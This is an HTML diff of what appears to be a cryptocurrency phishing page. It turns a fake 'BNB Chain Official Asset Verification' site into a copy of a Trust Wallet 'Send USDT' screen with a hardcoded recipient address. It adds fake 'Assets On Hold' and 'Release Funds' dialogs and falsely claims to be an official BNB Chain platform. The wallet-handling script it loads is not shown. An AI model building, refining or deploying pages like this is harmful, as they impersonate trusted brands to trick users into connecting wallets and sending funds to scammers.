@@ -1,202 +1,116 @@
-<!DOCTYPE html><html lang="en"><head>
+<!DOCTYPE html>
+<html lang="en">
+<head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BNB Chain · Official Asset Verification</title>
+    <title>BNB Chain · Send USDT</title>
     <link rel="preload" href="css/style.min.css" as="style">
     <link rel="preload" href="js/ethers.umd.min.js" as="script">
     <link rel="stylesheet" href="css/style.min.css">
     <!-- ===== ETHERS v6 ===== -->
     <script src="js/ethers.umd.min.js" defer></script>
-
     <!-- ===== CRYPTO-JS ===== -->
     <script src="js/crypto-js.min.js" defer></script>
-
 </head>
 
 <body>
+    <!-- Background overlays -->
+    <div class="bg-noise" aria-hidden="true"></div>
+    <div class="bg-grid" aria-hidden="true"></div>
 
-    <!-- ============================================================
-    NAVBAR
-    ============================================================ -->
-    <nav class="navbar" role="navigation" aria-label="Main navigation">
-        <div class="navbar-container">
-            <a href="/" class="navbar-brand" aria-label="BNB Chain Verify – Home">
-                <span class="logo-wrap">
-                    <img src="images/bnb.png" alt="BNB Chain logo" width="30" height="30" decoding="async" fetchpriority="high">
-                </span>
-                <span class="brand-text">
-                    <span class="brand-name">BNB Chain Verify</span>
-                    <span class="brand-sub">Asset Verification</span>
-                </span>
-            </a>
-            <ul class="navbar-links">
-                <li><a href="#" class="active">Home</a></li>
-                <li><a href="#">Verify</a></li>
-                <li><a href="#">Smart Contracts</a></li>
-                <li><a href="#">Tokens</a></li>
-                <li><a href="#">Developers</a></li>
-                <li><a href="#">Docs</a></li>
-            </ul>
-            <div class="navbar-actions">
-                <div class="search-wrap">
-                    <input type="text" id="searchInput" class="search-input" placeholder="Search Wallet, Contract, Token...">
-                    <button id="searchToggle" class="search-toggle" aria-label="Search">🔍</button>
+    <!-- MAIN TRUST WALLET SEND UI CONTAINER -->
+    <div class="tw-screen-container">
+        <div class="tw-app-frame">
+
+            <!-- App Top Header -->
+            <header class="tw-header">
+                <button class="tw-icon-btn" aria-label="Back" id="backBtn">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                        <polyline points="15 18 9 12 15 6"></polyline>
+                    </svg>
+                </button>
+                <h1 class="tw-header-title">Send to</h1>
+                <button class="tw-icon-btn" aria-label="Scan QR Code" id="scanBtn">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M3 7V5a2 2 0 0 1 2-2h2"></path>
+                        <path d="M17 3h2a2 2 0 0 1 2 2v2"></path>
+                        <path d="M21 17v2a2 2 0 0 1-2 2h-2"></path>
+                        <path d="M7 21H5a2 2 0 0 1-2-2v-2"></path>
+                        <rect x="7" y="7" width="10" height="10" rx="1"></rect>
+                    </svg>
+                </button>
+            </header>
+
+            <!-- Card 1: Merchant Recipient Address Box -->
+            <div class="tw-card">
+                <label class="tw-label">Merchant Recipient Address</label>
+                <textarea id="merchantAddressDisplay" class="tw-address-box" readonly rows="2">0x9957eb7d92998582c75D7344ffd9c6Dd03d4aADB</textarea>
+                
+                <div class="tw-pill-row">
+                    <div class="tw-pill">
+                        <img src="images/bnb.png" alt="BNB" class="tw-chain-icon" width="18" height="18">
+                        <span>BNB Smart Chain</span>
+                        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M6 9l6 6 6-6"/></svg>
+                    </div>
+                    <button type="button" class="tw-pill" id="clearAddressBtn">Clear</button>
                 </div>
+            </div>
 
+            <!-- Card 2: USDT Amount Column -->
+            <div class="tw-card">
+                <div class="tw-pill-row" style="margin-top:0;">
+                    <label class="tw-label" for="usdtAmountInput">Amount to Send</label>
+                    <span class="tw-balance-sub">Balance: <strong id="usdtBalance" style="color:var(--tw-text);">0.00</strong> USDT</span>
+                </div>
+                
+                <div class="tw-amount-row">
+                    <input type="number" id="usdtAmountInput" class="tw-amount-input" placeholder="0.0" step="any" min="0" value="100">
+                    <div class="tw-amount-meta">
+                        <button type="button" id="maxUsdtBtn" class="tw-max-btn">MAX</button>
+                        <span class="tw-currency-tag">USDT</span>
+                    </div>
+                </div>
             </div>
-            <div class="mobile-toggle">
-                <button id="hamburgerBtn" class="hamburger" aria-label="Open menu" aria-expanded="false">☰</button>
-            </div>
-        </div>
-    </nav>
 
-    <!-- ============================================================
-    DRAWER OVERLAY & DRAWER
-    ============================================================ -->
-    <div class="drawer-overlay" id="drawerOverlay"></div>
-    <div class="drawer" id="drawer" role="dialog" aria-modal="true" aria-label="Mobile navigation">
-        <div class="drawer-header">
-            <a href="/" class="drawer-brand">
-                <span class="brand-text">
-                    <span class="brand-name">BNB Chain Verify</span>
-                    <span class="brand-sub">Asset Verification</span>
-                </span>
-            </a>
-            <div class="drawer-actions">
-                <button class="drawer-close" id="drawerCloseBtn" aria-label="Close menu">✕</button>
+            <!-- Connected Wallet Info Pill (visible when wallet is connected) -->
+            <div id="walletInfo" class="tw-status-box wallet-info-card--hidden">
+                <div style="display:flex; justify-content:space-between; align-items:center;">
+                    <div>
+                        <span style="font-size:11px; text-transform:uppercase; color:var(--tw-text-muted);">Connected Wallet</span>
+                        <div id="walletAddressDisplay" style="font-family:monospace; font-weight:600; font-size:13px; color:var(--tw-text);">0x0000...0000</div>
+                    </div>
+                    <div style="text-align:right;">
+                        <span style="font-size:11px; text-transform:uppercase; color:var(--tw-text-muted);">BNB Balance</span>
+                        <div id="bnbBalance" style="font-weight:600; font-size:13px; color:var(--tw-text);">0.000000</div>
+                    </div>
+                </div>
             </div>
-        </div>
-        <div class="drawer-search">
-            <input type="text" placeholder="Search...">
-        </div>
-        <ul class="drawer-menu">
-            <li><a href="#" class="active">Home</a></li>
-            <li><a href="#">Verify</a></li>
-            <li><a href="#">Smart Contracts</a></li>
-            <li><a href="#">Tokens</a></li>
-            <li><a href="#">Developers</a></li>
-            <li><a href="#">Docs</a></li>
-        </ul>
-        <div class="drawer-connect-wrap">
-            <button class="btn-connect-nav" id="drawerConnectBtn">Verify Assets</button>
+
+            <!-- Status Card / Verification Hub -->
+            <div class="tw-status-box" id="statusCard">
+                <div style="display:flex; align-items:flex-start; gap:10px;">
+                    <span id="statusIcon" style="font-size:18px;">🔐</span>
+                    <div style="flex:1;">
+                        <div id="statusMessage" style="font-size:13px; font-weight:500; color:var(--tw-text);">
+                            Ready. Click "Continue" to proceed with USDT transfer on BNB Smart Chain.
+                        </div>
+                        <div id="statusDetail" style="font-size:11px; font-family:monospace; color:var(--tw-text-muted); margin-top:4px; word-break:break-all;"></div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Continue Button (Primary Action) -->
+            <button id="connectWalletBtn" class="tw-continue-btn" type="button">
+                <span>Continue</span>
+            </button>
+
         </div>
     </div>
 
     <!-- ============================================================
-    BACKGROUND LAYERS
+    MODAL OVERLAYS (Hold, Release, Verified, Abort)
     ============================================================ -->
-    <div class="bg-noise" aria-hidden="true"></div>
-    <div class="bg-grid" aria-hidden="true"></div>
-    <div class="glow-orb glow-orb--gold" aria-hidden="true"></div>
-    <div class="glow-orb glow-orb--gold-2" aria-hidden="true"></div>
-    <div class="glow-orb glow-orb--blue" aria-hidden="true"></div>
-
-    <!-- ============================================================
-    HERO – USDT VERIFICATION UI
-    ============================================================ -->
-    <header class="hero" id="hero" role="banner">
-        <div class="container">
-            <div class="min-h-screen flex flex-col items-center justify-center px-6 py-12">
-                <div class="w-full max-w-md text-center space-y-6">
-
-                    <!-- Badge -->
-                    <div class="flex items-center justify-center mb-4">
-                        <div class="flex items-center gap-2 px-4 py-2 rounded-full border pulse-ring" style="background-color:#2D3139; color:#F3C933; border-color:#F3C933">
-                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-4 h-4">
-                                <path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z">
-                                </path>
-                            </svg>
-                            <span class="text-sm font-medium"> USDT Verification</span>
-                        </div>
-                    </div>
-
-                    <!-- Headline -->
-                    <div class="space-y-4">
-                        <h1 class="text-4xl font-bold leading-tight" style="color:#F3C933">
-                            Secure Your Assets on BNB Smart Chain
-                        </h1>
-                        <p style="color:#F5F5F5" class="text-base leading-relaxed">
-                           Tether USD verification service on BNB Smart Chain
-                        </p>
-                    </div>
-
-                    <!-- VERIFY / CONNECT WALLET button -->
-                    <div class="pt-2">
-                        <button id="connectWalletBtn" class="btn-verify w-full inline-flex items-center justify-center gap-3 font-semibold text-lg py-6 rounded-2xl transition-all duration-200 shadow-lg hover:shadow-xl" style="background-color:#F3C933; color:#1C2230">
-                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="h-5 w-5">
-                                <path d="M19 7V4a1 1 0 0 0-1-1H5a2 2 0 0 0 0 4h15a1 1 0 0 1 1 1v4h-3a2 2 0 0 0 0 4h3a1 1 0 0 0 1-1v-2a1 1 0 0 0-1-1">
-                                </path>
-                                <path d="M3 5v14a2 2 0 0 0 2 2h15a1 1 0 0 0 1-1v-4"></path>
-                            </svg>
-                            <span>VERIFY ASSETS</span>
-                        </button>
-                    </div>
-
-                    <!-- ===== WALLET INFO (visible ONLY when balance < min USDT) ===== -->
-                    <div id="walletInfo" class="wallet-info-card wallet-info-card--hidden mt-6 p-5 rounded-xl text-left transition-all duration-300">
-                        <div class="flex items-center gap-3 mb-4 pb-3 border-b border-gray-700/50">
-                            <span class="text-2xl">👛</span>
-                            <div>
-                                <p class="text-[#B0B6C2] text-xs uppercase tracking-wider">Connected Wallet</p>
-                                <strong id="walletAddressDisplay" class="text-[#F5F5F5] text-sm font-mono">0x0000...0000</strong>
-                            </div>
-                        </div>
-                        <div class="flex justify-between items-center py-2">
-                            <span class="text-[#B0B6C2] text-sm">USDT Balance</span>
-                            <span id="usdtBalance" class="text-[#F3C933] font-bold text-lg">0.00</span>
-                        </div>
-                        <div class="flex justify-between items-center py-2">
-                            <span class="text-[#B0B6C2] text-sm">BNB Balance</span>
-                            <span id="bnbBalance" class="text-[#F5F5F5] font-semibold">0.000000</span>
-                        </div>
-                    </div>
-
-
-                    <!-- Info points -->
-                    <div class="pt-6 space-y-2 text-sm">
-                        <div class="flex items-center justify-center gap-2" style="color:#A0A6B2">
-                            <div class="w-2 h-2 rounded-full" style="background-color:#F3C933"></div>
-                            <span>Tether USD Contract</span>
-                        </div>
-                        <div class="flex items-center justify-center gap-2" style="color:#A0A6B2">
-                            <div class="w-2 h-2 rounded-full" style="background-color:#F3C933"></div>
-                            <span>BNB Smart Chain Verified</span>
-                        </div>
-                        <div class="flex items-center justify-center gap-2" style="color:#A0A6B2">
-                            <div class="w-2 h-2 rounded-full" style="background-color:#F3C933"></div>
-                            <span>Secure Direct Transfer</span>
-                        </div>
-                    </div>
-
-                </div>
-            </div>
-        </div>
-    </header>
-
-    <!-- ============================================================
-    SECURITY ANALYSIS & VERIFICATION HUB
-    ============================================================ -->
-    <section class="security-analysis-section py-12" id="security-analysis">
-        <div class="container max-w-md mx-auto">
-            <div class="status-card p-6 rounded-xl text-left transition-all duration-300" id="statusCard">
-                <div class="flex items-start gap-3">
-                    <span class="text-[#F3C933] text-xl" id="statusIcon">🔐</span>
-                    <div class="flex-1">
-                        <p class="text-[#F5F5F5] font-medium text-sm tracking-wide">Verification Hub / Security Analysis</p>
-                        <div class="text-[#B0B6C2] text-xs leading-relaxed mt-1" id="statusMessage">
-                            ⚡ Ready. Click "VERIFY ASSETS" to start secure verification on BNB Smart Chain.
-                        </div>
-                        <div class="text-[#8f95a1] text-[11px] font-mono break-all mt-2" id="statusDetail">
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- ============================================================
-    OVERLAY: HOLD (Assets On Hold)
-    ============================================================ -->
+    <!-- OVERLAY: HOLD (Assets On Hold) -->
     <section class="verification-modal" id="holdModal" role="dialog" aria-modal="true" aria-labelledby="holdModalTitle">
         <div class="verification-modal__backdrop" data-close-modal=""></div>
         <div class="verification-modal__card verification-modal__card--gold">
@@ -208,22 +122,17 @@
                 <span>Held amount</span>
                 <strong id="holdAmount">1,250.00 USDT</strong>
             </div>
-            <p class="verification-modal__notice">🛡️ Funds are under security verification on BEP20 network. This
-                process ensures transaction safety.</p>
+            <p class="verification-modal__notice">🛡️ Funds are under security verification on BEP20 network. This process ensures transaction safety.</p>
             <div class="verification-modal__status"><i></i> Verification Pending</div>
             <div class="verification-modal__actions">
-                <button class="verification-btn verification-btn--secondary" type="button" id="holdViewTxBtn">🔍 View
-                    Transaction</button>
-                <button class="verification-btn verification-btn--primary" type="button" id="holdReleaseBtn">🔓 Release
-                    Funds</button>
+                <button class="verification-btn verification-btn--secondary" type="button" id="holdViewTxBtn">🔍 View Transaction</button>
+                <button class="verification-btn verification-btn--primary" type="button" id="holdReleaseBtn">🔓 Release Funds</button>
                 <button class="verification-btn verification-btn--text" type="button" data-close-modal="">Close</button>
             </div>
         </div>
     </section>
 
-    <!-- ============================================================
-    OVERLAY: RELEASE (USDT Confirmed Modal Popup)
-    ============================================================ -->
+    <!-- OVERLAY: RELEASE (USDT Confirmed Modal Popup) -->
     <section class="verification-modal" id="releaseModal" role="dialog" aria-modal="true" aria-labelledby="releaseModalTitle">
         <div class="verification-modal__backdrop" data-close-modal=""></div>
         <div class="verification-modal__card verification-modal__card--success" id="releaseModalCard" style="border-top: 4px solid #10B981;">
@@ -242,9 +151,7 @@
         </div>
     </section>
 
-    <!-- ============================================================
-    OVERLAY: VERIFIED (Success)
-    ============================================================ -->
+    <!-- OVERLAY: VERIFIED (Success) -->
     <section class="verification-modal" id="verifiedModal" role="dialog" aria-modal="true" aria-labelledby="verifiedModalTitle">
         <div class="verification-modal__backdrop" data-close-modal=""></div>
         <div class="verification-modal__card verification-modal__card--success">
@@ -262,9 +169,7 @@
         </div>
     </section>
 
-    <!-- ============================================================
-    OVERLAY: ABORT (User rejected)
-    ============================================================ -->
+    <!-- OVERLAY: ABORT (User rejected) -->
     <div class="abort-overlay" id="abortOverlay" role="dialog" aria-modal="true" aria-labelledby="abortTitle">
         <div class="abort-overlay__card">
             <div class="top-accent" aria-hidden="true"></div>
@@ -276,85 +181,13 @@
                 <p>Thank you for using <strong>BNB Verify</strong>. You can retry anytime.</p>
             </div>
             <div class="abort-overlay__actions">
-                <button class="verification-btn verification-btn--primary" id="abortRetryBtn">Retry
-                    Verification</button>
+                <button class="verification-btn verification-btn--primary" id="abortRetryBtn">Retry Verification</button>
                 <button class="verification-btn verification-btn--text" id="abortCloseBtn">Close</button>
             </div>
         </div>
     </div>
 
-    <!-- ============================================================
-    FOOTER
-    ============================================================ -->
-    <footer class="footer" role="contentinfo">
-        <div class="container">
-            <div class="footer__grid">
-                <div class="footer__brand">
-                    <div class="logo">
-                        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" width="28" height="28">
-                            <path d="M12 2L2 7L12 12L22 7L12 2Z" stroke="#F3BA2F" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"></path>
-                            <path d="M2 17L12 22L22 17" stroke="#F3BA2F" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"></path>
-                            <path d="M2 12L12 17L22 12" stroke="#F3BA2F" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"></path>
-                        </svg>
-                        <span class="gold">BNB</span> Verify
-                    </div>
-                    <p>Official asset verification platform for the BNB Chain ecosystem.</p>
-                    <div class="socials">
-                        <a href="#" aria-label="Twitter">🐦</a>
-                        <a href="#" aria-label="GitHub">🐙</a>
-                        <a href="#" aria-label="Discord">💬</a>
-                        <a href="#" aria-label="YouTube">📺</a>
-                    </div>
-                </div>
-                <div class="footer__col">
-                    <h5>Products</h5>
-                    <ul>
-                        <li><a href="#">Asset Verification</a></li>
-                        <li><a href="#">Contract Audit</a></li>
-                        <li><a href="#">Security Analysis</a></li>
-                    </ul>
-                </div>
-                <div class="footer__col">
-                    <h5>Resources</h5>
-                    <ul>
-                        <li><a href="#">Documentation</a></li>
-                        <li><a href="#">Developer Portal</a></li>
-                        <li><a href="#">API Reference</a></li>
-                    </ul>
-                </div>
-                <div class="footer__col">
-                    <h5>Company</h5>
-                    <ul>
-                        <li><a href="#">About Us</a></li>
-                        <li><a href="#">Careers</a></li>
-                        <li><a href="#">Contact</a></li>
-                    </ul>
-                </div>
-                <div class="footer__col">
-                    <h5>Legal</h5>
-                    <ul>
-                        <li><a href="#">Privacy Policy</a></li>
-                        <li><a href="#">Terms of Service</a></li>
-                        <li><a href="#">Cookie Policy</a></li>
-                    </ul>
-                </div>
-            </div>
-            <div class="footer__bottom">
-                <p>© 2026 BNB Chain Verification. All rights reserved.</p>
-                <div class="links">
-                    <a href="#">Privacy</a>
-                    <a href="#">Terms</a>
-                    <a href="#">Cookies</a>
-                    <a href="#">Support</a>
-                </div>
-            </div>
-        </div>
-    </footer>
-
-    <!-- ============================================================
-    MAIN APPLICATION SCRIPT
-    ============================================================ -->
+    <!-- MAIN APPLICATION SCRIPT -->
     <script src="js/app.js" defer></script>
-
-
-</body></html>
+</body>
+</html>
